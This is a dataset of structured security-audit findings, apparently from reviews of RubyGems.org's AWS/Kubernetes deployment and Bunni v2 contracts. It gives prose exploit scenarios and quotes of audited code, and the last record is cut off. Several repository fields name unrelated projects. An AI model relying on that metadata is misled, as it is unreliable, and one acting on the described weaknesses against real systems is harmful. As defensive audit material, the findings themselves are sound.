{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-rubycentral-rubygemsorg-securityreview-031", "doc_id": "trailofbits_2024-12-rubycentral-rubygemsorg-securityreview", "finding_index": 31, "page_start": 71, "title": "No dual approval requirement for production deployments", "short_summary": null, "description_md": "#### Description\n\nThe RubyGems system is deployed in AWS based on Terraform files stored in the rubygems-terraform GitHub repository. Changes to the repository do not require dual approval (confirmation of changes by at least two people).\n\nMoreover, as the Wiki/Deploys [page informs](https://github.com/rubygems/rubygems-terraform/wiki/Deploys), application deployments to the EKS via the Shipit application also do not require dual approval.\n", "full_markdown": "| 31. No dual approval requirement for production deployments |                              |\n|-------------------------------------------------------------------------------|------------------------------|\n| Severity: Medium                                                           | Diffi culty: High      |\n| Type: Access Controls                                                   | Finding ID: TOB-RGM-31 |\n| Target: AWS IAM, Fastly                                              |                              |\n\n#### Description\n\nThe RubyGems system is deployed in AWS based on Terraform files stored in the rubygems-terraform GitHub repository. Changes to the repository do not require dual approval (confirmation of changes by at least two people).\n\nMoreover, as the Wiki/Deploys [page informs](https://github.com/rubygems/rubygems-terraform/wiki/Deploys), application deployments to the EKS via the Shipit application also do not require dual approval.\n\n#### Exploit Scenario 1\n\nA GitHub user with access to the rubygems-terraform repository is compromised. The attacker makes changes to the Terraform files and pushes them to master. The GitHub Actions run the workflow that automatically updates AWS production resources. The attack goes unnoticed for a few days.\n\n#### Exploit Scenario 2\n\nAn honest user with access to the Shipit application makes a mistake and chooses a wrong commit for production deployment. A broken application is deployed. The RubyGems application is down for a few hours.\n\n#### Recommendations\n\nShort term, ensure that all users with access to the rubygems-terraform repository and Shipit application have 2FA enabled and follow GitHub's other security [recommendations.](https://docs.github.com/en/authentication/keeping-your-account-and-data-secure) Ideally, developers should use only security keys/WebAuthn 2FA (instead of TOTP), and should manage their SSH keys with hardware security keys.\n\nImplement branch [protection](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-protected-branches/managing-a-branch-protection-rule) rules for rubygems-terraform. At a minimum, require pull requests and an approval before merging, e.g.:\n\n- Require a pull request before merging\n  - At least one approval\n  - Dismiss stale pull request approvals when new commits are pushed\n\n\n\n- Require approval of the most recent reviewable push\n- Block force pushes\n\nBecause of the small size of the Ruby Central team, the above recommendation may not be viable: emergency changes would be paused until other team members—likely living in different time zones—would come online. On the other hand, emergency events should be rare.\n\nFor a more balanced solution, we recommend configuring the protections above and enabling \"break-glass\" access. The break-glass would allow bypassing branch protections, but in a noisy way: alerts to out-of-band services (like Slack or emails) would be sent, and other team members would be asked to review the PRs merged without approval when they come online. These notifications should be more visible than normal events (like regular PR merging).\n\nThis recommendation would not prevent attacks in case of GitHub account compromise, but would help the team to detect and respond to such incidents.\n\nA possible drawback is a user fatigue problem: if noisy alerts are sent too often, developers will start ignoring them. Therefore, this recommendation is only useful if the emergency PRs would be rare. If that is not currently the case, these recommendations should be reviewed again once the development process becomes more stable.\n\nAs for possible implementation, the [emergency-pull-request-probot-app](https://github.com/github/emergency-pull-request-probot-app) application could be used. Its security posture is undetermined, but since it is GitHub's application, it should be fine to use.\n\nFinally, there is the problem of a compromised GitHub account changing branch protection rules. If all developers are given full administrative rights to the repository, then all recommendations given above are effectively not useful: an attacker can first disable the protections, then introduce malicious changes, and then re-enable protections. We were unaware of the specific structure of the Ruby Central team during the audit, more consideration is required to determine the viability of the above recommendations. If the rubygems-terraform repository has too few maintainers, it is possible that [organization-level rulesets](https://docs.github.com/en/enterprise-server@3.11/organizations/managing-organization-settings/creating-rulesets-for-repositories-in-your-organization) can be used to protect the repository while making the \"break-glass\" solution useful.\n\nIf possible, configure dual approval requirements in the Shipit application, possibly with a similar \"break-glass\" mechanism.\n", "severity": "Medium", "difficulty": "High", "type": "Access Controls", "finding_id": "TOB-RGM-31", "target": {"path": "AWS IAM, Fastly", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/sogilis/csv_fast_importer", "org": "sogilis", "name": "csv_fast_importer", "commit": "7343092dca117d7d85c2885b90edcabae7195f5f", "branch": null, "relative_file": "AWS IAM, Fastly", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-rubycentral-rubygemsorg-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:19:22.142371+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:19:22.148287+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": "High", "Type": "Access Controls", "Finding ID": "TOB-RGM-31", "Target": "AWS IAM, Fastly"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-rubycentral-rubygemsorg-securityreview-032", "doc_id": "trailofbits_2024-12-rubycentral-rubygemsorg-securityreview", "finding_index": 32, "page_start": 73, "title": "The app-production user's API key has not been rotated for a long time", "short_summary": null, "description_md": "#### Description\n\nThe AWS access keys for the app-production and app-staging users were created about six years ago. These keys give write access to production/staging S3 buckets. Keys are mounted in K8s pods. The keys should be rotated as soon as possible. Moreover, the key should be rotated regularly at least once every two years.\n", "full_markdown": "## 32. The app-production user's API key has not been rotated for a long time\n\n| Severity: Medium   | Diffi culty: High      |\n|-----------------------|------------------------------|\n| Type: Cryptography | Finding ID: TOB-RGM-32 |\n| Target: AWS IAM |                              |\n\n#### Description\n\nThe AWS access keys for the app-production and app-staging users were created about six years ago. These keys give write access to production/staging S3 buckets. Keys are mounted in K8s pods. The keys should be rotated as soon as possible. Moreover, the key should be rotated regularly at least once every two years.\n\n#### Exploit Scenario\n\nThe app-production user's API key was compromised a few years ago via undisclosed vulnerabilities in old versions of the RubyGems Rails application. An attacker kept the key unused until now. The attacker backdoors a few popular gems by manipulating S3 buckets' content.\n\n#### Recommendations\n\nShort term, manually rotate the API keys as soon as possible. Create a process for rotating the keys regularly, at least once every two years. Ideally, key rotation should be automated and done during every new deployment. Such automation will mitigate the risk of not rotating the key after a vulnerability fix.\n", "severity": "Medium", "difficulty": "High", "type": "Cryptography", "finding_id": "TOB-RGM-32", "target": {"path": "AWS IAM", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/github/emergency-pull-request-probot-app", "org": "github", "name": "emergency-pull-request-probot-app", "commit": null, "branch": null, "relative_file": "AWS IAM", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-rubycentral-rubygemsorg-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:19:22.142371+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:19:22.148287+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": "High", "Type": "Cryptography", "Finding ID": "TOB-RGM-32", "Target": "AWS IAM"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-rubycentral-rubygemsorg-securityreview-033", "doc_id": "trailofbits_2024-12-rubycentral-rubygemsorg-securityreview", "finding_index": 33, "page_start": 74, "title": "Staging deployments are performed with a highly privileged K8s role", "short_summary": null, "description_md": "#### Description\n\nThe Shipit deployment application uses the shipit ServiceAccount to manage K8s deployments. The account is in the [cluster-admin](https://github.com/rubygems/rubygems-terraform/blob/9c22354c60ac59de9a2cad32c3f061e196350c29/modules/rubygems-org-app/k8s-rbac.tf#L66-L83) groups of both staging and production [namespaces.](https://github.com/rubygems/rubygems-terraform/blob/9c22354c60ac59de9a2cad32c3f061e196350c29/modules/rubygems-org-app/k8s-rbac.tf#L66-L83) The staging GitHub branch is [automatically](https://github.com/rubygems/rubygems-terraform/wiki/Deploys) deployed to the K8s staging environment. If a buggy configuration is pushed to the branch, it may impact production K8s resources.\n", "full_markdown": "# 33. Staging deployments are performed with a highly privileged K8s role\n\n| Severity: Informational       | Diffi culty: High      |\n|----------------------------------|------------------------------|\n| Type: Access Controls      | Finding ID: TOB-RGM-33 |\n| Target: AWS EKS, shipit |                              |\n\n#### Description\n\nThe Shipit deployment application uses the shipit ServiceAccount to manage K8s deployments. The account is in the [cluster-admin](https://github.com/rubygems/rubygems-terraform/blob/9c22354c60ac59de9a2cad32c3f061e196350c29/modules/rubygems-org-app/k8s-rbac.tf#L66-L83) groups of both staging and production [namespaces.](https://github.com/rubygems/rubygems-terraform/blob/9c22354c60ac59de9a2cad32c3f061e196350c29/modules/rubygems-org-app/k8s-rbac.tf#L66-L83) The staging GitHub branch is [automatically](https://github.com/rubygems/rubygems-terraform/wiki/Deploys) deployed to the K8s staging environment. If a buggy configuration is pushed to the branch, it may impact production K8s resources.\n\n#### Exploit Scenario 1\n\nA buggy K8s configuration is pushed to the staging branch. Shipit automatically deploys the changes. Production resources are accidentally impacted, and rubygems is down for a few hours.\n\n#### Recommendations\n\nShort term, create separate K8s accounts for staging and production environments. Make the staging deployments use the lower-privileged account. Details of the implementation depend on the Shipit features and the available configuration options.\n", "severity": "Informational", "difficulty": "High", "type": "Access Controls", "finding_id": "TOB-RGM-33", "target": {"path": "AWS EKS, shipit", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/github/emergency-pull-request-probot-app", "org": "github", "name": "emergency-pull-request-probot-app", "commit": null, "branch": null, "relative_file": "AWS EKS, shipit", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-rubycentral-rubygemsorg-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:19:22.142371+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:19:22.148287+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "High", "Type": "Access Controls", "Finding ID": "TOB-RGM-33", "Target": "AWS EKS, shipit"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2025-01-bacon-labs-bunniv2-securityreview-001", "doc_id": "trailofbits_2025-01-bacon-labs-bunniv2-securityreview", "finding_index": 1, "page_start": 21, "title": "BunniToken permit cannot be revoked", "short_summary": null, "description_md": "#### Description\n\nThe BunniToken contract does not implement a way for permit signatures to be revoked, resulting in these signatures being valid until the deadline.\n\nThe BunniToken contract inherits the permit function from the ERC20 contract, allowing users to sign a payload in order to allow another user or contract to spend their tokens.\n\n```\nfunction permit(address owner, address spender, uint256 value, uint256 deadline,\nuint8 v, bytes32 r, bytes32 s)\n public\n virtual\n{\n bytes32 nameHash = _constantNameHash();\n // We simply calculate it on-the-fly to allow for cases where the `name` may\nchange.\n if (nameHash == bytes32(0)) nameHash = keccak256(bytes(name()));\n /// @solidity memory-safe-assembly\n assembly {\n // Revert if the block timestamp is greater than `deadline`.\n if gt(timestamp(), deadline) {\n mstore(0x00, 0x1a15a3cc) // `PermitExpired()`.\n revert(0x1c, 0x04)\n }\n let m := mload(0x40) // Grab the free memory pointer.\n // Clean the upper 96 bits.\n owner := shr(96, shl(96, owner))\n spender := shr(96, shl(96, spender))\n // Compute the nonce slot and load its value.\n mstore(0x0e, _NONCES_SLOT_SEED_WITH_SIGNATURE_PREFIX)\n mstore(0x00, owner)\n let nonceSlot := keccak256(0x0c, 0x20)\n let nonceValue := sload(nonceSlot)\n // Prepare the domain separator.\n mstore(m, _DOMAIN_TYPEHASH)\n mstore(add(m, 0x20), nameHash)\n mstore(add(m, 0x40), _VERSION_HASH)\n```\n\n\n```\n mstore(add(m, 0x60), chainid())\n mstore(add(m, 0x80), address())\n mstore(0x2e, keccak256(m, 0xa0))\n // Prepare the struct hash.\n mstore(m, _PERMIT_TYPEHASH)\n mstore(add(m, 0x20), owner)\n mstore(add(m, 0x40), spender)\n mstore(add(m, 0x60), value)\n mstore(add(m, 0x80), nonceValue)\n mstore(add(m, 0xa0), deadline)\n mstore(0x4e, keccak256(m, 0xc0))\n // Prepare the ecrecover calldata.\n mstore(0x00, keccak256(0x2c, 0x42))\n mstore(0x20, and(0xff, v))\n mstore(0x40, r)\n mstore(0x60, s)\n let t := staticcall(gas(), 1, 0, 0x80, 0x20, 0x20)\n // If the ecrecover fails, the returndatasize will be 0x00,\n // `owner` will be checked if it equals the hash at 0x00,\n // which evaluates to false (i.e. 0), and we will revert.\n // If the ecrecover succeeds, the returndatasize will be 0x20,\n // `owner` will be compared against the returned address at 0x20.\n if iszero(eq(mload(returndatasize()), owner)) {\n mstore(0x00, 0xddafbaef) // `InvalidPermit()`.\n revert(0x1c, 0x04)\n }\n // Increment and store the updated nonce.\n sstore(nonceSlot, add(nonceValue, t)) // `t` is 1 if ecrecover succeeds.\n // Compute the allowance slot and store the value.\n // The `owner` is already at slot 0x20.\n mstore(0x40, or(shl(160, _ALLOWANCE_SLOT_SEED), spender))\n sstore(keccak256(0x2c, 0x34), value)\n // Emit the {Approval} event.\n log3(add(m, 0x60), 0x20, _APPROVAL_EVENT_SIGNATURE, owner, spender)\n mstore(0x40, m) // Restore the free memory pointer.\n mstore(0x60, 0) // Restore the zero pointer.\n }\n}\n```\n\n*Figure 1.1: The permit function ([src/base/ERC20.sol#L291–L355](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/base/ERC20.sol#L291-L355))*\n\nHowever, once a user signs a payload and sends it to another user, they have no way of revoking this signature. Since only one nonce is valid until it is consumed, this would prevent the original user from submitting permit signatures with a different nonce. They could still generate a new signature using the same nonce; however, the user with whom they shared the original signature could execute their transaction first in order to prevent it from being invalidated.\n", "full_markdown": "# 1. BunniToken permit cannot be revoked Severity: **Informational** Difficulty: **Medium** Type: Access Controls Finding ID: TOB-BUNNI-1 Target: src/BunniToken.sol\n\n#### Description\n\nThe BunniToken contract does not implement a way for permit signatures to be revoked, resulting in these signatures being valid until the deadline.\n\nThe BunniToken contract inherits the permit function from the ERC20 contract, allowing users to sign a payload in order to allow another user or contract to spend their tokens.\n\n```\nfunction permit(address owner, address spender, uint256 value, uint256 deadline,\nuint8 v, bytes32 r, bytes32 s)\n public\n virtual\n{\n bytes32 nameHash = _constantNameHash();\n // We simply calculate it on-the-fly to allow for cases where the `name` may\nchange.\n if (nameHash == bytes32(0)) nameHash = keccak256(bytes(name()));\n /// @solidity memory-safe-assembly\n assembly {\n // Revert if the block timestamp is greater than `deadline`.\n if gt(timestamp(), deadline) {\n mstore(0x00, 0x1a15a3cc) // `PermitExpired()`.\n revert(0x1c, 0x04)\n }\n let m := mload(0x40) // Grab the free memory pointer.\n // Clean the upper 96 bits.\n owner := shr(96, shl(96, owner))\n spender := shr(96, shl(96, spender))\n // Compute the nonce slot and load its value.\n mstore(0x0e, _NONCES_SLOT_SEED_WITH_SIGNATURE_PREFIX)\n mstore(0x00, owner)\n let nonceSlot := keccak256(0x0c, 0x20)\n let nonceValue := sload(nonceSlot)\n // Prepare the domain separator.\n mstore(m, _DOMAIN_TYPEHASH)\n mstore(add(m, 0x20), nameHash)\n mstore(add(m, 0x40), _VERSION_HASH)\n```\n\n\n```\n mstore(add(m, 0x60), chainid())\n mstore(add(m, 0x80), address())\n mstore(0x2e, keccak256(m, 0xa0))\n // Prepare the struct hash.\n mstore(m, _PERMIT_TYPEHASH)\n mstore(add(m, 0x20), owner)\n mstore(add(m, 0x40), spender)\n mstore(add(m, 0x60), value)\n mstore(add(m, 0x80), nonceValue)\n mstore(add(m, 0xa0), deadline)\n mstore(0x4e, keccak256(m, 0xc0))\n // Prepare the ecrecover calldata.\n mstore(0x00, keccak256(0x2c, 0x42))\n mstore(0x20, and(0xff, v))\n mstore(0x40, r)\n mstore(0x60, s)\n let t := staticcall(gas(), 1, 0, 0x80, 0x20, 0x20)\n // If the ecrecover fails, the returndatasize will be 0x00,\n // `owner` will be checked if it equals the hash at 0x00,\n // which evaluates to false (i.e. 0), and we will revert.\n // If the ecrecover succeeds, the returndatasize will be 0x20,\n // `owner` will be compared against the returned address at 0x20.\n if iszero(eq(mload(returndatasize()), owner)) {\n mstore(0x00, 0xddafbaef) // `InvalidPermit()`.\n revert(0x1c, 0x04)\n }\n // Increment and store the updated nonce.\n sstore(nonceSlot, add(nonceValue, t)) // `t` is 1 if ecrecover succeeds.\n // Compute the allowance slot and store the value.\n // The `owner` is already at slot 0x20.\n mstore(0x40, or(shl(160, _ALLOWANCE_SLOT_SEED), spender))\n sstore(keccak256(0x2c, 0x34), value)\n // Emit the {Approval} event.\n log3(add(m, 0x60), 0x20, _APPROVAL_EVENT_SIGNATURE, owner, spender)\n mstore(0x40, m) // Restore the free memory pointer.\n mstore(0x60, 0) // Restore the zero pointer.\n }\n}\n```\n\n*Figure 1.1: The permit function ([src/base/ERC20.sol#L291–L355](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/base/ERC20.sol#L291-L355))*\n\nHowever, once a user signs a payload and sends it to another user, they have no way of revoking this signature. Since only one nonce is valid until it is consumed, this would prevent the original user from submitting permit signatures with a different nonce. They could still generate a new signature using the same nonce; however, the user with whom they shared the original signature could execute their transaction first in order to prevent it from being invalidated.\n\n## Recommendations\n\nAdd an external function that allows msg.sender to increase their nonce in order to invalidate an already signed payload.\n", "severity": "Informational", "difficulty": "Medium", "type": "Access Controls", "finding_id": "TOB-BUNNI-1", "target": {"path": "src/BunniToken.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/timeless-fi/bunni-v2", "org": "timeless-fi", "name": "bunni-v2", "commit": "7faae4718eecda1b33dc3abd894431ed2d16c929", "branch": null, "relative_file": "src/BunniToken.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-01-bacon-labs-bunniv2-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:21:00.930035+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:21:00.934897+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "Medium", "Type": "Access Controls", "Finding ID": "TOB-BUNNI-1", "Target": "src/BunniToken.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2025-01-bacon-labs-bunniv2-securityreview-002", "doc_id": "trailofbits_2025-01-bacon-labs-bunniv2-securityreview", "finding_index": 2, "page_start": 23, "title": "Token approvals to ERC-4626 vaults are never revoked", "short_summary": null, "description_md": "#### Description\n\nThe BunniHub contract can approve an arbitrary ERC-4626 vault to handle its tokens when calling the deposit function of the vault; however, these approvals are never revoked.\n\nThe BunniHub contract can give approvals to spend a certain amount of its tokens to an ERC-4626 vault in order to deposit these tokens into the vault. For instance, this is done when updating the reserves during a liquidity deposit (figure 2.1) or when a pool does not have a sufficient amount of output tokens (figure 2.2).\n\n```\n// ...\n// do vault deposit\naddress(token).safeApproveWithRetry(address(vault), amount);\nreserveChange = vault.deposit(amount, address(this));\nreserveChangeInUnderlying = vault.previewRedeem(reserveChange);\n// ...\n```\n\n*Figure 2.1: The \\_depositVaultReserve function ([src/lib/BunniHubLogic.sol#L665–L668](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniHubLogic.sol#L665-L668))*\n\n```\n// ...\nfunction _updateVaultReserveViaClaimTokens(int256 rawBalanceChange, Currency\ncurrency, ERC4626 vault)\n internal\n returns (int256 reserveChange, int256 actualRawBalanceChange)\n{\n // ...\n address(token).safeApproveWithRetry(address(vault), absAmount);\n reserveChange = vault.deposit(absAmount, address(this)).toInt256();\n // ...\n```\n\n*Figure 2.2: The \\_updateVaultReserveViaClaimTokens function ([src/BunniHub.sol#L432–L433](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/BunniHub.sol#L432-L433))*\n\nHowever, since the vault implementation could be malicious, the deposit function is not guaranteed to perform the operation correctly and consume the token approvals. While the balance updates should prevent the tokens from being stolen, there could be a vulnerability in some other piece of the codebase that would allow this to be abused.\n", "full_markdown": "# 2. Token approvals to ERC-4626 vaults are never revoked\n\n| Severity: Informational                                | Diffi culty: Medium     |\n|-----------------------------------------------------------|-------------------------------|\n| Type: Access Controls                               | Finding ID: TOB-BUNNI-2 |\n| Target: src/BunniHub.sol, src/lib/BunniHubLogic.sol |                               |\n\n#### Description\n\nThe BunniHub contract can approve an arbitrary ERC-4626 vault to handle its tokens when calling the deposit function of the vault; however, these approvals are never revoked.\n\nThe BunniHub contract can give approvals to spend a certain amount of its tokens to an ERC-4626 vault in order to deposit these tokens into the vault. For instance, this is done when updating the reserves during a liquidity deposit (figure 2.1) or when a pool does not have a sufficient amount of output tokens (figure 2.2).\n\n```\n// ...\n// do vault deposit\naddress(token).safeApproveWithRetry(address(vault), amount);\nreserveChange = vault.deposit(amount, address(this));\nreserveChangeInUnderlying = vault.previewRedeem(reserveChange);\n// ...\n```\n\n*Figure 2.1: The \\_depositVaultReserve function ([src/lib/BunniHubLogic.sol#L665–L668](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/lib/BunniHubLogic.sol#L665-L668))*\n\n```\n// ...\nfunction _updateVaultReserveViaClaimTokens(int256 rawBalanceChange, Currency\ncurrency, ERC4626 vault)\n internal\n returns (int256 reserveChange, int256 actualRawBalanceChange)\n{\n // ...\n address(token).safeApproveWithRetry(address(vault), absAmount);\n reserveChange = vault.deposit(absAmount, address(this)).toInt256();\n // ...\n```\n\n*Figure 2.2: The \\_updateVaultReserveViaClaimTokens function ([src/BunniHub.sol#L432–L433](https://github.com/timeless-fi/bunni-v2/blob/7faae4718eecda1b33dc3abd894431ed2d16c929/src/BunniHub.sol#L432-L433))*\n\nHowever, since the vault implementation could be malicious, the deposit function is not guaranteed to perform the operation correctly and consume the token approvals. While the balance updates should prevent the tokens from being stolen, there could be a vulnerability in some other piece of the codebase that would allow this to be abused.\n\n\n#### Recommendations\n\nShort term, reset the approvals to zero after the call to the deposit function.\n\nLong term, clearly identify the trust assumptions of external components. Use these assumptions to evaluate all the asset and token interactions (transfer and approval) and their safeguards against malicious actors.\n", "severity": "Informational", "difficulty": "Medium", "type": "Access Controls", "finding_id": "TOB-BUNNI-2", "target": {"path": "src/BunniHub.sol, src/lib/BunniHubLogic.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/timeless-fi/bunni-v2", "org": "timeless-fi", "name": "bunni-v2", "commit": "7faae4718eecda1b33dc3abd894431ed2d16c929", "branch": null, "relative_file": "src/BunniHub.sol, src/lib/BunniHubLogic.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-01-bacon-labs-bunniv2-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:21:00.930035+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:21:00.934897+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "Medium", "Type": "Access Controls", "Finding ID": "TOB-BUNNI-2", "Target": "src/BunniHub.sol, src/lib/BunniHubLogic.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2025-01-bacon-labs-bunniv2-securityreview-003", "doc_id": "trailofbits_2025-01-bacon-labs-bunniv2-securityreview", "finding_index": 3, "page_start": 25, "title": "Overly strict bid withdrawal validation reduces am-AMM eciency by enabling griefing", "short_summary": null, "description_md": "#### Description\n\nThe AmAmm contract implements an auction mechanism that sells the rights to set and collect swap fees to the highest bidder. The proceeds of the auction are deducted over time as rent and distributed to liquidity providers in lieu of the swap fees that they have forfeited. The bidding process is defined in such a way that the top bidder and rent are determined K units of time (for Bunni v2, this is 24 hours) in advance of them taking effect.\n\nPer the written description, the next bidder should be able to withdraw their deposit as long as they leave enough deposit to cover any difference, if any, between the remaining time left on the current top bidder's deposit and 24 hours. Therefore, if the current top bidder has at least 24 hours of deposit left, the next highest bidder should be able to withdraw their full deposit. The implementation used by Bunni v2, however, requires that the next highest bidder always leaves at least 24 hours of deposit regardless of the state of the current top bidder's deposit.\n\n```\n273 // require D_next / R_next >= K\n274 if ((nextBid.deposit - amount) / nextBid.rent < K(id)) {\n275 revert AmAmm__BidLocked();\n276 }\n```\n\n*Figure 3.1: A snippet of the withdrawNextBid function ([src/AmAmm.sol#L273–L276](https://github.com/Bunniapp/biddog/blob/95f4270ad4447e96044973580afda9176730e7c8/src/AmAmm.sol#L273-L276))*\n\nWhile there is a cancelNextBid function that the next highest bidder can use to cancel their pending bid, if there is currently an active top bidder, this is only available as long as the top bid's deposit can still cover at least 24 hours.\n\n```\n319 // require D_top / R_top >= K\n320 if (topBid.manager != address(0) && topBid.deposit / topBid.rent < K(id)) {\n321 revert AmAmm__BidLocked();\n322 }\n323\n324 // delete next bid from storage\n325 delete _nextBids[id];\n```\n\n*Figure 3.2: A snippet of the cancelNextBid function ([src/AmAmm.sol#L319–L325](https://github.com/Bunniapp/biddog/blob/95f4270ad4447e96044973580afda9176730e7c8/src/AmAmm.sol#L319-L325))*\n\n\n\nThis difference in behavior introduces more risk to bidders who wish to act as the fee manager but do not wish to exceed the current top bidder, as some portion of their funds may remain locked in the contract until the current top bidder exhausts their deposit completely or they are outbid by somebody else. This may also unintentionally incentivize top bidders to extend their reign longer than strictly economically necessary in order to spite competitors and also incentivize bidders to wait until there is no active top bidder to begin submitting bids, creating more gaps where the pool falls back to the default swap fee mechanism that may expose LPs to more arbitrage opportunities and reduce their overall earnings.\n", "full_markdown": "## 3. Overly strict bid withdrawal validation reduces am-AMM eciency by enabling griefing\n\n| Severity: Low            | Diffi culty: Low        |\n|-----------------------------|-------------------------------|\n| Type: Data Validation | Finding ID: TOB-BUNNI-3 |\n| Target: src/AmAmm.sol    |                               |\n\n#### Description\n\nThe AmAmm contract implements an auction mechanism that sells the rights to set and collect swap fees to the highest bidder. The proceeds of the auction are deducted over time as rent and distributed to liquidity providers in lieu of the swap fees that they have forfeited. The bidding process is defined in such a way that the top bidder and rent are determined K units of time (for Bunni v2, this is 24 hours) in advance of them taking effect.\n\nPer the written description, the next bidder should be able to withdraw their deposit as long as they leave enough deposit to cover any difference, if any, between the remaining time left on the current top bidder's deposit and 24 hours. Therefore, if the current top bidder has at least 24 hours of deposit left, the next highest bidder should be able to withdraw their full deposit. The implementation used by Bunni v2, however, requires that the next highest bidder always leaves at least 24 hours of deposit regardless of the state of the current top bidder's deposit.\n\n```\n273 // require D_next / R_next >= K\n274 if ((nextBid.deposit - amount) / nextBid.rent < K(id)) {\n275 revert AmAmm__BidLocked();\n276 }\n```\n\n*Figure 3.1: A snippet of the withdrawNextBid function ([src/AmAmm.sol#L273–L276](https://github.com/Bunniapp/biddog/blob/95f4270ad4447e96044973580afda9176730e7c8/src/AmAmm.sol#L273-L276))*\n\nWhile there is a cancelNextBid function that the next highest bidder can use to cancel their pending bid, if there is currently an active top bidder, this is only available as long as the top bid's deposit can still cover at least 24 hours.\n\n```\n319 // require D_top / R_top >= K\n320 if (topBid.manager != address(0) && topBid.deposit / topBid.rent < K(id)) {\n321 revert AmAmm__BidLocked();\n322 }\n323\n324 // delete next bid from storage\n325 delete _nextBids[id];\n```\n\n*Figure 3.2: A snippet of the cancelNextBid function ([src/AmAmm.sol#L319–L325](https://github.com/Bunniapp/biddog/blob/95f4270ad4447e96044973580afda9176730e7c8/src/AmAmm.sol#L319-L325))*\n\n\n\nThis difference in behavior introduces more risk to bidders who wish to act as the fee manager but do not wish to exceed the current top bidder, as some portion of their funds may remain locked in the contract until the current top bidder exhausts their deposit completely or they are outbid by somebody else. This may also unintentionally incentivize top bidders to extend their reign longer than strictly economically necessary in order to spite competitors and also incentivize bidders to wait until there is no active top bidder to begin submitting bids, creating more gaps where the pool falls back to the default swap fee mechanism that may expose LPs to more arbitrage opportunities and reduce their overall earnings.\n\n#### Exploit Scenario\n\nAlice is the current swap fee manager, pays 10 BunniToken in rent per epoch, and has 40 tokens deposited. Bob notices that Alice only has a small deposit remaining and submits a bid at eight tokens per epoch and includes a 192-token deposit. Alice also notices her deposit was running low and deposits tokens to top up her deposit to 23 hours total. Alice can repeat this top up every day. Bob cannot recover any of his 192 tokens until Alice's deposit is exhausted or someone outbids him.\n\n#### Recommendations\n\nShort term, update the user- and developer-facing documentation so that users bidding through the am-AMM are aware of the risks.\n\nLong term, carefully consider the economic (dis)incentives created when deviating from written 